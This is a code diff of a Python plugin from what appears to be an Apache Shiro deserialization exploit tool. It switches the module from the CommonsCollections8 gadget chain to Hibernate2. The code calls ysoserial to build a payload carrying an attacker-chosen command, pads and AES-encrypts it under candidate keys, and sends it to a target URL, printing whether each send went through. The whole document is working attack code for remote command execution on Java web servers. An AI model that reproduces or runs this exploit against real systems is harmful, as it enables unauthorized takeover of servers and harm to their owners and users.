@@ -15,10 +15,9 @@ requests.packages.urllib3.disable_warnings()
 
 JAR_FILE = 'moule/ysoserial.jar'
 
-@Idea.plugin_register('Class11:CommonsCollections8')
-class CommonsCollections8(object):
+@Idea.plugin_register('Class18:Hibernate2')
+class Hibernate2(object):
     def process(self,url,command,resKey,func):
-        # self.poc(url,command, thre,resKey)
         self.sendPayload(url,command,resKey)
 
 
@@ -27,7 +26,7 @@ class CommonsCollections8(object):
         target = url
         if not os.path.exists(fp):
             raise Exception('jar file not found!')
-        popen = subprocess.Popen(['java', '-jar', fp, 'CommonsCollections8', command],       #popen
+        popen = subprocess.Popen(['java', '-jar', fp, 'Hibernate2', command],       #popen
                                     stdout=subprocess.PIPE)
         BS = AES.block_size
         pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
@@ -44,9 +43,9 @@ class CommonsCollections8(object):
             #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
             if(r.status_code==200):
  
-                print("[+]   ****CommonsCollections8模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
+                print("[+]   ****Hibernate2模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
             else:
-                print("[-]   ****CommonsCollections8模块   key: {} 发送异常！    状态码:{}".format(str(key),str(r.status_code)))
+                print("[-]   ****Hibernate2模块   key: {} 发送异常！    状态码:{}".format(str(key),str(r.status_code)))
         except Exception as e:
             print(e)
             return False
